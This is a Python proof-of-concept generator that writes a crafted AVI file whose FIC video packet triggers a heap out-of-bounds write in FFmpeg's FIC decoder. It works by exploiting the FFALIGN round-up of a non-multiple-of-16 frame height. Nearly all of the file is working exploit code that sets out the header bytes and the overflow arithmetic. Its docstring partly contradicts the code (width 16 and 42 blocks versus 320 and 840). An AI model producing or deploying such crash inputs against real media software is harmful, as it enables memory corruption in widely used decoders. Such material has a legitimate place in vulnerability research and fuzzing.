#!/usr/bin/env python3
"""
PoC generator for VULN 001: Heap OOB Write in fic_decode_slice()

Vulnerability: fic_decode_frame() computes the last slice height as
  FFALIGN(avctx->height - ctx->slice_h * (nslices-1), 16)
which rounds UP to a multiple of 16. When avctx->height is NOT a
multiple of 16, this exceeds the allocated frame buffer.

With height=100, FFALIGN(100, 16) = 112. The decoder writes 112 rows
but the frame buffer only holds 100 rows => 12 rows of heap OOB write.

Trigger: AVI container wrapping a FIC packet with width=16, height=100.
"""

import struct
import sys
import os

# ─── Constants from fic.c ────────────────────────────────────────────
FIC_MAGIC   = b'\x00\x00\x01FICV'   # bytes 0-6
FIC_HEADER_SIZE = 27

# Target dimensions: height NOT a multiple of 16 => triggers FFALIGN round-up.
# Use a wide frame so the V-plane overflow (6 rows * stride/2 bytes) extends
# well past the av_malloc trailing padding (~64 bytes), making ASAN catch it.
#
# height=100: FFALIGN(100,16)=112  => last slice_h=112 but buffer=100 rows
#   Y overflow: 12 rows * 320 bytes = 3840 bytes (into U+V intra-buffer)
#   C overflow:  6 rows * 160 bytes =  960 bytes PAST end of malloc'd block
#   64-byte av_malloc padding << 960 bytes => ASAN heap-buffer-overflow ✓
WIDTH  = 320
HEIGHT = 100   # NOT a multiple of 16

NSLICES = 1

def make_fic_packet():
    """
    Build a raw FIC packet (the payload that fic_decode_frame receives).

    Packet layout (FIC_HEADER_SIZE = 27 bytes):
      [0 -  6] magic: 0x000001 'FICV'
      [7 - 12] unused header fields (zeroed)
      [13]     nslices
      [14-16]  unused (zeroed)
      [17]     skip_frame = 0
      [18-22]  unused (zeroed)
      [23]     quality = 1 (HQ matrix)
      [24-26]  tsize  (AV_RB24, big-endian) = 0 (no cursor blob)
    After header:
      [27-30]  slice_offset[0] = 0 (AV_RB32, 1 * 4 bytes)
      [31+]    slice bitstream data

    Slice bitstream encoding:
      Each 8×8 block is encoded as 8 bits (1 byte = 0x00):
        bit 0   = 0  (NOT a skip block)
        bits 1-7 = 0000000  (num_coeff = 0)
      With 0 coefficients, block[] stays all-zero and fic_idct_put()
      writes a valid (zero-valued) 8×8 block to dst.

    aligned_width  = FFALIGN(16,16)  = 16  => 2 blocks/row in Y, 1 in C
    aligned_height = FFALIGN(100,16) = 112 => 14 block-rows in Y, 7 in C
    Total blocks = Y(2*14) + U(1*7) + V(1*7) = 28+7+7 = 42
    Providing 42 zero-bytes lets the decoder process all 14 Y block-rows,
    including rows 96-103 and 104-111 which are BEYOND the frame buffer.

    msize check: msize > aligned_width/8 * aligned_height/8 / 8
                       = 2 * 14 / 8 = 3  (integer)
    msize = packet_size - nslices*4 - tsize - FIC_HEADER_SIZE
          = (27 + 4 + 42) - 4 - 0 - 27 = 42  => 42 > 3 ✓
    """
    hdr = bytearray(FIC_HEADER_SIZE)
    hdr[0:7]  = FIC_MAGIC
    hdr[13]   = NSLICES
    hdr[17]   = 0          # not a skip frame
    hdr[23]   = 1          # HQ quality matrix
    # bytes 24-26: tsize = 0 (big-endian, already zero)

    # Slice offset table: 1 entry, 4 bytes big-endian, value = 0
    slice_offsets = struct.pack('>I', 0)

    # Slice data: zero bytes (non-skip blocks, 0 coefficients)
    # Each 0x00 byte = [0 not-skip][0000000 num_coeff=0]
    # fic_idct_put writes 8 rows for each block-column group.
    #
    # For WIDTH=320, HEIGHT=100:
    #   aligned_width=320, aligned_height=112
    #   Y blocks per row: 320/8=40,  block-rows: 112/8=14  total=560
    #   C blocks per row: 160/8=20,  block-rows:  56/8=7   total=140 each
    #   Grand total: 560+140+140 = 840 blocks = 840 bytes
    #
    # The 13th Y block-row (y=96) and 7th C block-row (y=48 in C) write
    # past the frame buffer (buffer rows=100 Y / 50 C).
    aligned_w = ((WIDTH  + 15) // 16) * 16
    aligned_h = ((HEIGHT + 15) // 16) * 16
    y_blocks  = (aligned_w // 8) * (aligned_h // 8)
    c_blocks  = (aligned_w // 16) * (aligned_h // 16)
    num_blocks = y_blocks + 2 * c_blocks
    slice_data = bytes(num_blocks)   # all 0x00

    return bytes(hdr) + slice_offsets + slice_data


def pack_fourcc(s):
    return s.encode('ascii') if isinstance(s, str) else s

def chunk(fourcc, data):
    """AVI chunk: 4-byte fourcc + 4-byte LE size + data (+ optional pad byte)."""
    raw = data if isinstance(data, (bytes, bytearray)) else data
    pad = b'\x00' if len(raw) % 2 else b''
    return pack_fourcc(fourcc) + struct.pack('<I', len(raw)) + raw + pad

def list_chunk(list_type, data):
    """AVI LIST chunk: 'LIST' + size + 4-byte list-type + data."""
    raw = data if isinstance(data, (bytes, bytearray)) else data
    pad = b'\x00' if (4 + len(raw)) % 2 else b''
    inner = pack_fourcc(list_type) + raw
    return b'LIST' + struct.pack('<I', len(inner)) + inner + pad


def make_avi(fic_packet):
    """Wrap fic_packet in a minimal AVI 1.0 container."""

    # ── AVIH – Main AVI Header (56 bytes) ──────────────────────────
    avih_data = struct.pack('<14I',
        33333,          # dwMicroSecPerFrame  (30 fps)
        0,              # dwMaxBytesPerSec
        0,              # dwPaddingGranularity
        0x00000010,     # dwFlags (AVIF_HASINDEX)
        1,              # dwTotalFrames
        0,              # dwInitialFrames
        1,              # dwStreams
        len(fic_packet),# dwSuggestedBufferSize
        WIDTH,          # dwWidth
        HEIGHT,         # dwHeight
        0, 0, 0, 0,     # dwReserved[4]
    )

    avih_chunk = chunk('avih', avih_data)

    # ── STRH – Stream Header (56 bytes) ────────────────────────────
    strh_data = (
        b'vids'                     # fccType
        b'FICV'                     # fccHandler
        + struct.pack('<IHHIIIIIII',
            0,              # dwFlags
            0,              # wPriority
            0,              # wLanguage (combined into one DWORD in older specs; split here)
            0,              # dwInitialFrames
            1,              # dwScale
            30,             # dwRate  (30 fps)
            0,              # dwStart
            1,              # dwLength
            len(fic_packet),# dwSuggestedBufferSize
            0xFFFFFFFF,     # dwQuality  (-1 = default)
        )
        + struct.pack('<I', 0)      # dwSampleSize
        + struct.pack('<hhhh', 0, 0, WIDTH, HEIGHT)  # rcFrame
    )
    strh_chunk = chunk('strh', strh_data)

    # ── STRF – BITMAPINFOHEADER (40 bytes) ─────────────────────────
    strf_data = struct.pack('<IiiHHIIiiII',
        40,             # biSize
        WIDTH,          # biWidth
        HEIGHT,         # biHeight  (positive = bottom-up, FFmpeg handles both)
        1,              # biPlanes
        24,             # biBitCount
        # biCompression = 'FICV' (little-endian FOURCC)
        struct.unpack('<I', b'FICV')[0],
        0,              # biSizeImage
        0,              # biXPelsPerMeter
        0,              # biYPelsPerMeter
        0,              # biClrUsed
        0,              # biClrImportant
    )
    strf_chunk = chunk('strf', strf_data)

    strl_list  = list_chunk('strl', strh_chunk + strf_chunk)
    hdrl_list  = list_chunk('hdrl', avih_chunk + strl_list)

    # ── movi – video data ───────────────────────────────────────────
    frame_chunk = chunk('00dc', fic_packet)
    movi_list   = list_chunk('movi', frame_chunk)

    # ── idx1 – old-style index ──────────────────────────────────────
    # Offset is measured from start of movi data (after 'movi' fourcc = 4 bytes).
    # The frame chunk starts at offset 0 within movi data... but the standard
    # says offset from start of movi chunk's data (i.e., after the 'movi' tag).
    idx1_entry = (
        b'00dc'
        + struct.pack('<III',
            0x00000010,             # AVIIF_KEYFRAME
            4,                      # dwOffset: 4 bytes past start of movi data
            len(fic_packet),        # dwSize
        )
    )
    idx1_chunk = chunk('idx1', idx1_entry)

    riff_data = b'AVI ' + hdrl_list + movi_list + idx1_chunk
    riff_file = b'RIFF' + struct.pack('<I', len(riff_data)) + riff_data

    return riff_file


def main():
    out_dir = os.path.dirname(os.path.abspath(__file__))
    out_path = os.path.join(out_dir, 'vuln_001_input.fic')

    fic_packet = make_fic_packet()
    avi_data   = make_avi(fic_packet)

    with open(out_path, 'wb') as f:
        f.write(avi_data)

    print(f"[+] Written {len(avi_data)} bytes to {out_path}")
    aligned_h = ((HEIGHT + 15) // 16) * 16
    print(f"    FIC packet size : {len(fic_packet)} bytes")
    print(f"    Target dimensions: {WIDTH}x{HEIGHT}")
    print(f"    FFALIGN({HEIGHT},16)  = {aligned_h}  =>  last slice_h overflows by {aligned_h-HEIGHT} rows")


if __name__ == '__main__':
    main()
